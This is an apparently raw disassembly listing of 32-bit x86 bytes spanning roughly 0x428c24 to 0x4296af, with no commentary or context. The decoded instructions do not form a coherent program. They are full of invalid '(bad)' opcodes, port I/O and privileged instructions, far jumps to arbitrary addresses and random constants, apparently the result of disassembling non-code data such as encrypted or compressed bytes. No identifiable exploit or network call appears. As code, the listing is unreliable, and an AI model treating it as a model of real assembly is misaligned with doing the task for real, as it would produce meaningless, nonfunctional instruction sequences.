  428c24:	pop    ss
  428c25:	(bad)  
  428c26:	sub    edx,esi
  428c28:	dec    BYTE PTR [ecx-0x27]
  428c2b:	inc    esi
  428c2c:	in     eax,dx
  428c2d:	repz aas 
  428c2f:	out    dx,eax
  428c30:	scas   eax,DWORD PTR es:[edi]
  428c31:	dec    ecx
  428c32:	xchg   esi,eax
  428c33:	mov    eax,0x71386f28
  428c38:	mov    esp,0xc3ea1e0e
  428c3d:	xor    DWORD PTR es:[ebp+eax*4-0x59],esp
  428c42:	jb     0x428bfc
  428c44:	push   ebp
  428c45:	clc    
  428c46:	mov    ds:0xd28b007b,al
  428c4b:	test   eax,0x6f02c33f
  428c50:	jnp    0x428bec
  428c52:	pop    ss
  428c53:	push   0xffffffbd
  428c55:	dec    ebp
  428c56:	sub    eax,0x19691f31
  428c5b:	call   0xac8:0x641471b1
  428c62:	pop    ebp
  428c63:	push   eax
  428c64:	adc    edx,eax
  428c66:	je     0x428c38
  428c68:	inc    edx
  428c69:	mov    edi,0x66f77871
  428c6e:	aaa    
  428c6f:	mov    edi,0xa97cc175
  428c74:	hlt    
  428c75:	and    esi,esi
  428c77:	and    BYTE PTR [edx+0x7552eb86],cl
  428c7d:	mov    bh,0x9e
  428c7f:	test   al,0x50
  428c81:	icebp  
  428c82:	pop    edi
  428c83:	nop
  428c84:	mov    WORD PTR [eax+0x51],?
  428c87:	push   es
  428c88:	and    eax,0xe0823f63
  428c8d:	push   ds
  428c8e:	cmc    
  428c8f:	and    BYTE PTR [ebx-0x41],ah
  428c92:	dec    esp
  428c93:	into   
  428c94:	sub    DWORD PTR [ecx+0x4],ebp
  428c97:	mov    edi,0x8a14895e
  428c9d:	sbb    al,0x9d
  428c9f:	pop    ebp
  428ca0:	ins    DWORD PTR es:[edi],dx
  428ca1:	xor    eax,0x50cba45f
  428ca6:	ins    BYTE PTR es:[edi],dx
  428ca7:	pop    eax
  428ca8:	push   edi
  428ca9:	cwde   
  428caa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428cab:	out    dx,eax
  428cac:	ret    0xaef0
  428caf:	pop    ss
  428cb0:	popa   
  428cb1:	mov    BYTE PTR [edx*2+0x7715647c],0x6c
  428cb9:	scas   eax,DWORD PTR es:[edi]
  428cba:	stos   BYTE PTR es:[edi],al
  428cbb:	fnstenv [edx+0x29eb84de]
  428cc1:	imul   ebp,DWORD PTR [edi-0x3e4282ef],0x2f9b05ff
  428ccb:	scas   al,BYTE PTR es:[edi]
  428ccc:	inc    esp
  428ccd:	stos   BYTE PTR es:[edi],al
  428cce:	mov    dl,0x6b
  428cd0:	push   ecx
  428cd1:	push   esp
  428cd2:	aad    0x2
  428cd4:	xor    eax,0xab0bcf9e
  428cd9:	jl     0x428d21
  428cdb:	je     0x428d08
  428cdd:	xor    ecx,DWORD PTR [ebp-0x6c]
  428ce0:	adc    edi,DWORD PTR [eax+0x122febf3]
  428ce6:	mov    edx,0xa3ce1d9e
  428ceb:	mov    ah,0xb2
  428ced:	fistp  DWORD PTR [ecx]
  428cef:	xor    ebp,ebp
  428cf1:	and    BYTE PTR [ecx-0x11],dl
  428cf4:	dec    eax
  428cf5:	in     eax,dx
  428cf6:	fcomip st,st(5)
  428cf8:	retf   
  428cf9:	pop    ebx
  428cfa:	jae    0x428d44
  428cfc:	imul   esi,DWORD PTR [edx-0x7599723f],0x53631b13
  428d06:	(bad)  
  428d07:	(bad)  
  428d08:	sti    
  428d09:	jne    0x428cfa
  428d0b:	shr    DWORD PTR [edi+0x13f7d31f],0x0
	...
  428d72:	add    BYTE PTR [eax],al
  428d74:	xor    DWORD PTR [ebp+0x75f531f1],0xcc90b5c1
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0x7977
  428d82:	push   edx
  428d83:	jnp    0x428dbc
  428d85:	mov    ch,0x1
  428d87:	add    BYTE PTR ds:0x60000001,al
  428d8d:	pushf  
  428d8e:	shr    BYTE PTR [edi+0x3a903c2],0xf8
  428d95:	mov    ebx,0x89d19769
  428d9a:	sbb    edx,DWORD PTR ds:0xa9f943d5
  428da0:	retf   
  428da1:	jo     0x428dda
  428da3:	xlat   BYTE PTR ds:[ebx]
  428da4:	lods   eax,DWORD PTR ds:[esi]
  428da5:	dec    ebx
  428da6:	rep outs dx,DWORD PTR ds:[esi]
  428da8:	mov    bh,BYTE PTR [eax+0x24e4c81]
  428dae:	sar    ah,1
  428db0:	cmp    bl,BYTE PTR [ecx+0x5f]
  428db3:	arpl   WORD PTR [edi],bx
  428db5:	xchg   ebx,eax
  428db6:	sub    al,0xdb
  428db8:	daa    
  428db9:	xor    al,0x20
  428dbb:	lods   eax,DWORD PTR ds:[esi]
  428dbc:	jae    0x428d7e
  428dbe:	mov    al,0x10
  428dc0:	and    al,0x6a
  428dc2:	dec    esi
  428dc3:	lods   eax,DWORD PTR ds:[esi]
  428dc4:	mov    ds:0xcf12a0be,al
  428dc9:	push   esi
  428dca:	push   ss
  428dcb:	repz inc edi
  428dcd:	jl     0x428dce
  428dcf:	add    al,BYTE PTR [esi]
  428dd1:	dec    esi
  428dd2:	es std 
  428dd4:	pop    esp
  428dd5:	xor    esi,DWORD PTR [edx-0x3b]
  428dd8:	cmc    
  428dd9:	fild   DWORD PTR [ebx]
  428ddb:	sbb    DWORD PTR [eax+0x17add9d9],ebp
  428de1:	pop    ebp
  428de2:	test   eax,0x1ac28a65
  428de7:	mov    ebp,0x96b5df07
  428dec:	das    
  428ded:	sub    al,0x7f
  428def:	xchg   edi,eax
  428df0:	pop    ecx
  428df1:	fsubrp st(1),st
  428df3:	pop    edi
  428df4:	jbe    0x428e3e
  428df6:	mov    ebx,0x95439a51
  428dfb:	dec    al
  428dfd:	rcr    BYTE PTR [edi-0x5ff82f52],1
  428e03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428e04:	inc    ebp
  428e05:	pop    ebp
  428e06:	stos   DWORD PTR es:[edi],eax
  428e07:	jl     0x428e7f
  428e09:	mov    edi,0xf7570793
  428e0e:	jnp    0x428dc8
  428e10:	js     0x428e02
  428e12:	bound  eax,QWORD PTR [ecx]
  428e14:	clc    
  428e15:	push   cs
  428e16:	mov    BYTE PTR [ebx-0x44ef22ed],cl
  428e1c:	jecxz  0x428dc5
  428e1e:	std    
  428e1f:	call   0x6fd0d2d1
  428e24:	scas   al,BYTE PTR es:[edi]
  428e25:	ins    BYTE PTR es:[edi],dx
  428e26:	jb     0x428e6c
  428e28:	int    0x7c
  428e2a:	(bad)  
  428e2b:	fsubr  st,st(5)
  428e2d:	int    0x15
  428e2f:	jmp    0x9327:0xdbead6e3
  428e36:	fld    DWORD PTR [ecx-0x71241f0f]
  428e3c:	bound  esp,QWORD PTR [ecx+0x3341ddfb]
  428e42:	push   ecx
  428e43:	sub    BYTE PTR [ecx-0x5c7e6e00],dl
  428e49:	(bad)  
  428e4a:	call   0xfe98:0x5c962284
  428e51:	loopne 0x428e98
  428e53:	add    eax,ecx
  428e55:	push   ebx
  428e56:	test   eax,0x5ba21338
  428e5b:	inc    ecx
  428e5c:	add    BYTE PTR [eax-0x41bab686],ah
  428e62:	cmp    al,dl
  428e64:	xor    BYTE PTR [edi+ebp*1+0x25d2b923],dh
  428e6b:	out    0x80,eax
  428e6d:	into   
  428e6e:	mov    ch,0x93
  428e70:	cdq    
  428e71:	jge    0x428ea1
  428e73:	outs   dx,BYTE PTR ds:[esi]
  428e74:	push   ds
  428e75:	xlat   BYTE PTR ds:[ebx]
  428e76:	mov    esp,DWORD PTR [esi-0x15]
  428e79:	cmp    BYTE PTR [ecx+edx*4],ch
  428e7c:	jmp    0x6b6c:0x431c699e
  428e83:	adc    eax,0x832685d2
  428e88:	lods   al,BYTE PTR ds:[esi]
  428e89:	stos   DWORD PTR es:[edi],eax
  428e8a:	cmp    BYTE PTR [edi],dh
  428e8c:	test   eax,0x95f4c68
	...
  428ef1:	add    BYTE PTR [eax],al
  428ef3:	add    BYTE PTR [edi+0x5d],cl
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0xd6
  428f01:	cmp    bl,bh
  428f03:	aad    0x3c
  428f05:	mov    dh,0x1
  428f07:	add    BYTE PTR ds:0xcb000001,al
  428f0d:	mov    ecx,0x903861dc
  428f12:	js     0x428f84
  428f14:	xchg   esi,eax
  428f15:	fwait
  428f16:	push   esi
  428f17:	lds    esi,FWORD PTR ds:0x446d6cee
  428f1d:	xchg   ecx,eax
  428f1e:	je     0x428ea9
  428f20:	pop    ecx
  428f21:	cdq    
  428f22:	add    ch,bl
  428f24:	adc    eax,0xf8243ba2
  428f29:	aas    
  428f2a:	fistp  QWORD PTR [ebp-0x4c]
  428f2d:	dec    ecx
  428f2e:	int3   
  428f2f:	push   edi
  428f30:	outs   dx,BYTE PTR ds:[esi]
  428f31:	mov    al,ds:0x26b7d7e1
  428f36:	add    eax,DWORD PTR [ebp-0x2e2191ff]
  428f3c:	fadd   QWORD PTR [eax+0x25]
  428f3f:	popf   
  428f40:	adc    bl,BYTE PTR [ecx]
  428f42:	jns    0x428eff
  428f44:	adc    BYTE PTR [ebp-0x7a],0x99
  428f48:	pop    ss
  428f49:	adc    cl,BYTE PTR [ecx-0x1f09067]
  428f4f:	retf   0xb341
  428f52:	adc    edx,DWORD PTR [ebp-0x6f9b4fb7]
  428f58:	mov    BYTE PTR [esi],ch
  428f5a:	outs   dx,DWORD PTR gs:[esi]
  428f5c:	pop    esi
  428f5d:	push   ecx
  428f5e:	dec    esp
  428f5f:	fisttp WORD PTR [ebx]
  428f61:	(bad)  
  428f62:	jmp    0xc6e6fda0
  428f67:	loope  0x428f35
  428f69:	mov    gs,WORD PTR ds:0x865ec1cf
  428f6f:	xchg   esi,eax
  428f70:	fistp  QWORD PTR [edi-0x30e987e6]
  428f76:	in     eax,0xd4
  428f78:	in     al,dx
  428f79:	repz push es
  428f7b:	xor    al,0xf4
  428f7d:	repz jecxz 0x428f48
  428f80:	and    DWORD PTR [edx],edi
  428f82:	jne    0x428f2f
  428f84:	js     0x428fc6
  428f86:	jb     0x428fdf
  428f88:	or     bl,BYTE PTR [ebp+edx*2+0x5d8cbb85]
  428f8f:	mov    dh,0x49
  428f91:	(bad)  
  428f93:	(bad)  
  428f94:	es lahf 
  428f96:	or     eax,0xfc049e7
  428f9b:	cmp    bh,ah
  428f9d:	jb     0x428f41
  428f9f:	scas   al,BYTE PTR es:[edi]
  428fa0:	stos   BYTE PTR es:[edi],al
  428fa1:	adc    DWORD PTR [ebp-0x5d6afe90],ecx
  428fa7:	xchg   ebx,eax
  428fa8:	inc    eax
  428fa9:	and    al,0x2c
  428fab:	sub    al,0xee
  428fad:	shr    ah,1
  428faf:	sbb    cl,BYTE PTR [ecx]
  428fb1:	xcrypt-ofb (bad)
  428fb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428fb3:	test   al,0x8a
  428fb5:	sti    
  428fb6:	(bad)  
  428fb7:	(bad)  
  428fb8:	mov    WORD PTR [edx+0x79],?
  428fbb:	inc    ebx
  428fbc:	mov    bh,0x17
  428fbe:	cs xchg esi,eax
  428fc0:	shl    BYTE PTR [edx],0x5b
  428fc3:	(bad)  
  428fc4:	mov    ah,0x88
  428fc6:	and    BYTE PTR [edx+0x3d],bl
  428fc9:	or     dl,bl
  428fcb:	fisubr WORD PTR ds:0x258a5662
  428fd1:	jmp    0x500f:0xe1bcbd84
  428fd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428fd9:	test   eax,0x6b49504e
  428fde:	fdivr  DWORD PTR [edx]
  428fe0:	dec    esp
  428fe1:	dec    esp
  428fe2:	jo     0x429004
  428fe4:	aad    0x0
  428fe6:	cmp    DWORD PTR [esi-0x785ac5c7],ebx
  428fec:	jg     0x42904c
  428fee:	int3   
  428fef:	xor    al,0xf5
  428ff1:	clc    
  428ff2:	cli    
  428ff3:	push   edi
  428ff4:	outs   dx,BYTE PTR ds:[esi]
  428ff5:	push   ds
  428ff6:	xor    BYTE PTR [esp+ecx*2+0x681ba982],dl
  428ffd:	pop    ebx
  428ffe:	ins    BYTE PTR es:[edi],dx
  428fff:	jne    0x428fa7
  429001:	inc    edi
  429002:	mov    DWORD PTR [edi],edx
  429004:	jae    0x428fba
  429006:	and    cl,0xc0
  429009:	stc    
  42900a:	ror    BYTE PTR [edi+eiz*2],1
  42900d:	cmp    BYTE PTR [ebx],bh
  42900f:	and    DWORD PTR [ebx],ebp
	...
  429071:	add    BYTE PTR [eax],al
  429073:	add    cl,ah
  429075:	in     al,dx
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0x84fc7b77
  429081:	sbb    al,0xca
  429083:	dec    edi
  429084:	inc    ecx
  429085:	mov    bh,0x1
  429087:	add    BYTE PTR ds:0x48000001,al
  42908d:	repnz xor BYTE PTR ds:0x446c9e85,ah
  429094:	call   0xd5c4:0xfe963614
  42909b:	sahf   
  42909c:	mov    ah,0xd8
  42909e:	xchg   edi,eax
  42909f:	fimul  WORD PTR [edx+eiz*8]
  4290a2:	leave  
  4290a3:	xchg   ecx,eax
  4290a4:	ds addr16 xchg ecx,eax
  4290a7:	sub    al,0xdd
  4290a9:	mov    ds:0xe7e1d4d4,al
  4290ae:	in     al,0x49
  4290b0:	imul   esp,DWORD PTR [edx+0x5402ed6c],0xffffffc8
  4290b7:	mov    WORD PTR [edx-0xd],cs
  4290ba:	std    
  4290bb:	xchg   edx,eax
  4290bc:	sbb    eax,DWORD PTR [ebp-0x48]
  4290bf:	inc    esp
  4290c0:	pop    ss
  4290c1:	(bad)  
  4290c2:	ja     0x429059
  4290c4:	jmp    0x42911a
  4290c6:	test   DWORD PTR [edx],ecx
  4290c8:	in     al,dx
  4290c9:	sub    edx,ebx
  4290cb:	repz fidiv WORD PTR [edi]
  4290ce:	mov    ch,0x44
  4290d0:	jmp    0x429098
  4290d2:	pop    ebp
  4290d3:	ficomp DWORD PTR [edi+esi*8+0x5c]
  4290d7:	mov    ebp,0xd10fbb9d
  4290dc:	jle    0x429105
  4290de:	pop    esp
  4290df:	jo     0x4290ae
  4290e1:	mov    esp,0x5204b9b8
  4290e6:	jns    0x42913d
  4290e8:	adc    eax,0x110a9b8e
  4290ed:	and    DWORD PTR [ecx+ebx*8],ebp
  4290f0:	out    0x46,al
  4290f2:	add    ecx,DWORD PTR [ebx+0x47]
  4290f5:	shr    DWORD PTR [ebx+edi*4-0x16],0xde
  4290fa:	mov    eax,ds:0x6abfe645
  4290ff:	jne    0x4290f2
  429101:	jp     0x4290ea
  429103:	jne    0x4290ce
  429105:	mov    bl,0x72
  429107:	popa   
  429108:	mov    al,ds:0x6edc3ed0
  42910d:	pop    esi
  42910e:	cld    
  42910f:	and    al,0x23
  429111:	mov    ebx,0x102e2a3a
  429116:	pop    ebp
  429117:	out    dx,al
  429118:	ss jno 0x429105
  42911b:	(bad)  
  42911d:	lods   al,BYTE PTR ds:[esi]
  42911e:	add    al,0xf8
  429120:	and    ebp,DWORD PTR [edi+0x12]
  429123:	mov    ah,0x35
  429125:	mov    WORD PTR [ecx+0x4f5e6bf4],?
  42912b:	dec    eax
  42912c:	shl    BYTE PTR ss:[esi],cl
  42912f:	cmp    al,0x98
  429131:	push   ds
  429132:	bound  ebx,QWORD PTR [eax]
  429134:	xor    al,0xaf
  429136:	push   DWORD PTR [esi]
  429138:	cwde   
  429139:	fs in  al,dx
  42913b:	sbb    ecx,DWORD PTR [eax+0x53]
  42913e:	inc    ecx
  42913f:	dec    DWORD PTR es:[edx]
  429142:	mov    ah,0x10
  429144:	xchg   esp,eax
  429145:	and    eax,0xf485c555
  42914a:	icebp  
  42914b:	lock imul ecx,DWORD PTR [ecx+0xf74161b],0x2f
  429153:	dec    ebp
  429154:	xor    esi,eax
  429156:	mov    ds:0xbd8352dc,eax
  42915b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42915d:	les    ecx,FWORD PTR [edi-0x47]
  429160:	(bad)  
  429161:	rcr    BYTE PTR [ebx+eax*1+0x4bf731ad],1
  429168:	(bad)  
  429169:	lahf   
  42916a:	rol    eax,0x97
  42916d:	lods   eax,DWORD PTR ds:[esi]
  42916e:	shl    DWORD PTR ds:0xf8c1c8ca,1
  429174:	cmp    DWORD PTR [ebx+0x47049fb6],ebp
  42917a:	retf   
  42917b:	xlat   BYTE PTR ds:[ebx]
  42917c:	loope  0x429127
  42917e:	or     edi,edx
  429180:	xor    al,0x78
  429182:	sub    eax,0x16cf960
  429187:	push   edi
  429188:	in     al,dx
  429189:	fimul  DWORD PTR [ebx]
  42918b:	or     eax,0x5b37d108
  429190:	sub    al,0x0
	...
  4291f2:	add    BYTE PTR [eax],al
  4291f4:	push   esi
  4291f5:	xchg   ebp,edi
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [eax+edx*2+0x4639f7aa],0x50001b8
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    al,cl
  42920d:	mov    dh,0xe4
  42920f:	sahf   
  429210:	adc    eax,0x42dfd3c
  429215:	(bad)  
  429216:	loope  0x4291a1
  429218:	ds ds and ecx,esi
  42921c:	cli    
  42921d:	mov    esp,ebx
  42921f:	int3   
  429220:	popa   
  429221:	ins    BYTE PTR es:[edi],dx
  429222:	mov    eax,ds:0xe5455a5c
  429227:	call   0x10d69708
  42922c:	mov    esp,0x6af796be
  429231:	sub    dh,BYTE PTR ds:0xa3d48ebb
  429237:	sbb    eax,0x90e32
  42923c:	and    BYTE PTR [ecx],ch
  42923e:	xor    ecx,DWORD PTR [ebp-0x7861a119]
  429244:	inc    ebx
  429245:	cdq    
  429246:	and    DWORD PTR [eax-0x68],0x927c67f9
  42924d:	leave  
  42924e:	test   eax,0x3d0e586a
  429253:	out    dx,al
  429254:	jge    0x42923f
  429256:	sahf   
  429257:	pop    ebx
  429258:	scas   eax,DWORD PTR es:[edi]
  429259:	mov    ah,0x72
  42925b:	fs adc eax,0x338aa860
  429261:	xchg   ebx,eax
  429262:	leave  
  429263:	push   edi
  429264:	enter  0xa904,0xeb
  429268:	nop
  429269:	mov    esi,0x4d303535
  42926e:	jno    0x429269
  429270:	out    0xd1,al
  429272:	xor    BYTE PTR [edx+0x2a47e0fe],dh
  429278:	adc    BYTE PTR [ebx+0x266c3101],0xd8
  42927f:	imul   edi,ebx,0x5fa25bb2
  429285:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429286:	jns    0x4292ff
  429288:	aas    
  429289:	punpcklwd mm4,mm0
  42928c:	adc    esp,DWORD PTR [edx-0x383ad4fb]
  429292:	mov    dh,BYTE PTR [ebp+ebp*1+0x59d63641]
  429299:	mov    ecx,0xacee8f4b
  42929e:	push   ds
  42929f:	test   al,0x1f
  4292a1:	mov    bh,0xb2
  4292a3:	jmp    0x42931a
  4292a5:	test   BYTE PTR [ebp+0x11dcef19],ah
  4292ab:	lods   eax,DWORD PTR ds:[esi]
  4292ac:	push   0x82870510
  4292b1:	jns    0x4292d4
  4292b3:	mov    bl,0x0
  4292b5:	je     0x429241
  4292b7:	fsubr  DWORD PTR [ebx+ebp*4+0x794a957a]
  4292be:	add    al,0xee
  4292c0:	cmp    al,0x9
  4292c2:	jl     0x4292d0
  4292c4:	and    ebx,edx
  4292c6:	sar    BYTE PTR [edi-0x47dcd432],cl
  4292cc:	cli    
  4292cd:	fdivp  st(5),st
  4292cf:	pusha  
  4292d0:	call   0xc32b:0x883019c9
  4292d7:	scas   al,BYTE PTR es:[edi]
  4292d8:	xor    dh,BYTE PTR [ebx+0x7c]
  4292db:	outs   dx,DWORD PTR ds:[esi]
  4292dc:	mov    edi,?
  4292de:	pop    ecx
  4292df:	jno    0x429343
  4292e1:	daa    
  4292e2:	ja     0x429350
  4292e4:	nop
  4292e5:	mov    ebx,DWORD PTR [edx+ecx*4+0x620a140b]
  4292ec:	ror    ah,cl
  4292ee:	mov    al,ds:0xfa4a547d
  4292f3:	xchg   edi,eax
  4292f4:	aas    
  4292f5:	mov    al,0xac
  4292f7:	xchg   ecx,eax
  4292f8:	aaa    
  4292f9:	inc    esi
  4292fa:	sub    DWORD PTR ds:0x570f4939,0x67f40b62
  429304:	retf   
  429305:	lea    eax,ds:[eax+0x52]
  429309:	lods   al,BYTE PTR ds:[esi]
  42930a:	sti    
  42930b:	inc    esp
  42930c:	out    dx,eax
  42930d:	and    edx,esp
  42930f:	test   al,0x58
	...
  429371:	add    BYTE PTR [eax],al
  429373:	add    al,dh
  429375:	adc    al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0x32
  429381:	adc    ecx,DWORD PTR [edi]
  429383:	test   eax,0x1b94b
  429388:	add    eax,0xeb000001
  42938d:	push   eax
  42938e:	xor    DWORD PTR ds:[ebp-0x3a73732d],ecx
  429395:	pop    esp
  429396:	mov    bl,0x4e
  429398:	leave  
  429399:	outs   dx,BYTE PTR ds:[esi]
  42939a:	jb     0x4293ef
  42939c:	out    0x22,eax
  42939e:	push   ebx
  42939f:	pop    es
  4293a0:	xchg   BYTE PTR [ebx+edx*1-0x5aa0d685],ah
  4293a7:	popf   
  4293a8:	jne    0x4293c9
  4293aa:	std    
  4293ab:	loop   0x4293a6
  4293ad:	jg     0x429360
  4293af:	jne    0x4293f8
  4293b1:	inc    esi
  4293b2:	and    eax,0xfce6c35c
  4293b7:	xchg   eax,esi
  4293b9:	inc    esi
  4293ba:	bound  ecx,QWORD PTR [ecx+0x6b6f7ccb]
  4293c0:	or     edx,DWORD PTR [esi]
  4293c2:	or     al,0x12
  4293c4:	(bad)  
  4293c5:	jo     0x429390
  4293c7:	dec    esi
  4293c8:	out    0x4,al
  4293ca:	out    dx,eax
  4293cb:	xchg   DWORD PTR [edx],edx
  4293cd:	inc    ebp
  4293ce:	in     eax,0xdd
  4293d0:	cmp    eax,0x4b77a3f6
  4293d5:	shl    dl,cl
  4293d7:	arpl   sp,di
  4293d9:	xor    DWORD PTR [ecx+0x1],edx
  4293dc:	lods   eax,DWORD PTR ds:[esi]
  4293dd:	cdq    
  4293de:	xor    al,0x3d
  4293e0:	js     0x429366
  4293e2:	mov    bh,BYTE PTR [ebp-0x331a2dda]
  4293e8:	add    al,0x3a
  4293ea:	pushf  
  4293eb:	mov    gs,esi
  4293ed:	in     eax,dx
  4293ee:	(bad)  
  4293ef:	leave  
  4293f0:	add    eax,0xec244e2d
  4293f5:	fisttp WORD PTR [ebx+0x3b23b539]
  4293fb:	inc    ecx
  4293fc:	in     eax,dx
  4293fd:	pop    esp
  4293fe:	push   eax
  4293ff:	jns    0x429383
  429401:	fcmove st,st(5)
  429403:	test   eax,0x6d319d5e
  429408:	inc    eax
  429409:	cwde   
  42940a:	push   edx
  42940b:	mov    dl,dh
  42940d:	xor    eax,0x79212634
  429412:	push   esi
  429413:	fldcw  WORD PTR [edi+0x36]
  429416:	shr    BYTE PTR [esi-0x5f],cl
  429419:	and    al,0x96
  42941b:	pop    ss
  42941c:	mov    ebx,DWORD PTR [eax]
  42941e:	mov    bl,0x6b
  429420:	sub    BYTE PTR [edi],0xa6
  429423:	cmp    al,0xdf
  429425:	jb     0x4293ae
  429427:	mov    bh,0xd1
  429429:	mov    WORD PTR [ebx-0x226fcddd],ss
  42942f:	rcl    BYTE PTR ds:0x38b81800,0x99
  429436:	call   0x1bd50a45
  42943b:	jle    0x429443
  42943d:	pop    ebx
  42943e:	cld    
  42943f:	dec    eax
  429440:	and    al,0x16
  429442:	aam    0x6f
  429444:	mov    ebp,0x84b2132e
  429449:	sbb    eax,0xc5ae440
  42944e:	cmp    al,0xbe
  429450:	mov    bl,0x41
  429452:	jae    0x4293eb
  429454:	jnp    0x429433
  429456:	mov    bh,0x90
  429458:	arpl   WORD PTR [esi],bx
  42945a:	mov    bh,0x22
  42945c:	daa    
  42945d:	int3   
  42945e:	sub    BYTE PTR [eax],cl
  429460:	or     DWORD PTR [ebx-0x72],edx
  429463:	mov    al,0xfb
  429465:	jbe    0x429479
  429467:	inc    ecx
  429468:	dec    esi
  429469:	sub    BYTE PTR [edx-0x73],ch
  42946c:	int3   
  42946d:	in     eax,0x7f
  42946f:	sbb    DWORD PTR [esi+0x63],esp
  429472:	xor    DWORD PTR [esi+0x5d2d801d],0x56
  429479:	push   0xf091225e
  42947e:	sub    esi,DWORD PTR [edi+0x76ef632b]
  429484:	dec    edi
  429485:	mov    ah,0x37
  429487:	jecxz  0x4294f2
  429489:	push   eax
  42948a:	aam    0xf5
  42948c:	mov    ecx,0x543c28ef
	...
  4294f1:	add    BYTE PTR [eax],al
  4294f3:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  4294f7:	sub    al,0x53
  4294f9:	ds jg  0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp+0xd30f9ea],dx
  429503:	xchg   esp,eax
  429504:	push   eax
  429505:	mov    edx,0x1050001
  42950a:	add    BYTE PTR [eax],al
  42950c:	sub    DWORD PTR [edi],eax
  42950e:	or     esi,DWORD PTR [esi-0x4b]
  429511:	push   edx
  429512:	dec    eax
  429513:	and    cl,BYTE PTR [ecx-0x7a7eca59]
  429519:	jbe    0x429500
  42951b:	pop    eax
  42951c:	mov    ecx,0xa2dd14ec
  429521:	push   0x68
  429523:	adc    al,0x74
  429525:	sub    DWORD PTR ds:0x7fe6b347,ebx
  42952b:	adc    DWORD PTR [esi],esp
  42952d:	sbb    DWORD PTR [ebp+0x1675bcbc],ebp
  429533:	mul    ebx
  429535:	iret   
  429536:	add    ebp,esi
  429538:	out    0x32,al
  42953a:	jmp    0x43316753
  42953f:	je     0x429541
  429541:	dec    esp
  429542:	xchg   edx,eax
  429543:	push   es
  429544:	rcl    DWORD PTR [ecx+ebx*8+0x70adee2c],cl
  42954b:	jnp    0x429563
  42954d:	xchg   ebp,eax
  42954e:	or     BYTE PTR [edi+0x58],ah
  429551:	sub    DWORD PTR [edi],0x22ef5ac0
  429557:	sbb    BYTE PTR [ecx+0x7a63d072],0xee
  42955e:	mov    eax,ds:0x32b33fdf
  429563:	mov    ds:0xa8773e0a,al
  429568:	aad    0x1a
  42956a:	add    DWORD PTR [ebp-0x55],ebp
  42956d:	xor    bl,BYTE PTR [eax+0x7]
  429570:	jb     0x4295d7
  429572:	hlt    
  429573:	daa    
  429574:	mov    esp,0xc2505807
  429579:	icebp  
  42957a:	sub    ebp,edx
  42957c:	and    DWORD PTR [edx],edi
  42957e:	xor    bh,BYTE PTR [edi]
  429580:	ins    DWORD PTR es:[edi],dx
  429581:	fst    DWORD PTR [ebx+0x21]
  429584:	mov    esp,0xf4a64737
  429589:	lea    edx,[eax]
  42958b:	cli    
  42958c:	adc    BYTE PTR [edx],0x6f
  42958f:	test   al,0xba
  429591:	mov    edx,0x903b96a2
  429596:	shl    BYTE PTR [ebx],1
  429598:	push   esi
  429599:	xchg   edx,eax
  42959a:	ins    BYTE PTR es:[edi],dx
  42959b:	(bad)  
  42959c:	enter  0x3b56,0xc2
  4295a0:	adc    ah,BYTE PTR [edx+esi*1]
  4295a3:	pop    es
  4295a4:	scas   eax,DWORD PTR es:[edi]
  4295a5:	ret    0x8e8c
  4295a8:	add    edx,DWORD PTR [esi]
  4295aa:	cdq    
  4295ab:	jmp    0x48eb197
  4295b0:	repz mov ds:0x13338f06,eax
  4295b6:	jnp    0x429605
  4295b8:	mov    dl,bl
  4295ba:	scas   al,BYTE PTR es:[edi]
  4295bb:	pop    ss
  4295bc:	and    al,0xb9
  4295be:	test   edi,ebx
  4295c0:	inc    esp
  4295c1:	repnz or cl,al
  4295c4:	call   0xfaa2:0x45172651
  4295cb:	inc    eax
  4295cc:	adc    eax,0x1540a180
  4295d1:	out    0x5d,eax
  4295d3:	sahf   
  4295d4:	popf   
  4295d5:	or     DWORD PTR [bp+di-0x2dbc],0x5d299fd9
  4295de:	jp     0x429606
  4295e0:	mov    bl,0xc8
  4295e2:	aas    
  4295e3:	adc    eax,0x1caa1550
  4295e8:	pop    ds
  4295e9:	scas   al,BYTE PTR es:[edi]
  4295ea:	sbb    al,0xb2
  4295ec:	pop    ecx
  4295ed:	jb     0x429656
  4295ef:	sbb    eax,0x1a49e0b4
  4295f4:	or     DWORD PTR [esi-0x253317f5],0x5fd5b1b7
  4295fe:	dec    ebp
  4295ff:	(bad)  
  429600:	jl     0x429620
  429602:	mov    edi,0x2aae78c
  429607:	pushf  
  429608:	fnstenv [edi]
  42960a:	adc    BYTE PTR [edi-0x5ab1020b],0xf9
	...
  429671:	add    BYTE PTR [eax],al
  429673:	add    BYTE PTR [ebp+0x1d],ch
  429676:	out    0xc0,al
  429678:	idiv   bl
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	test   al,0x17
  429682:	push   es
  429683:	sbb    edx,DWORD PTR [ebp-0x45]
  429686:	add    DWORD PTR [eax],eax
  429688:	add    eax,0x83000001
  42968d:	mov    esp,0x7bc79b8c
  429692:	lahf   
  429693:	xchg   edi,eax
  429694:	das    
  429695:	scas   al,BYTE PTR es:[edi]
  429696:	mov    bl,0x6a
  429698:	aaa    
  429699:	nop    DWORD PTR [ecx+0x6]
  42969d:	fsubr  st,st(4)
  42969f:	int3   
  4296a0:	in     al,0x4d
  4296a2:	jnp    0x42964d
  4296a4:	cs mov esp,0xc2a01da3
  4296aa:	mov    ds:0x1535be38,al
  4296af:	lock inc ebp
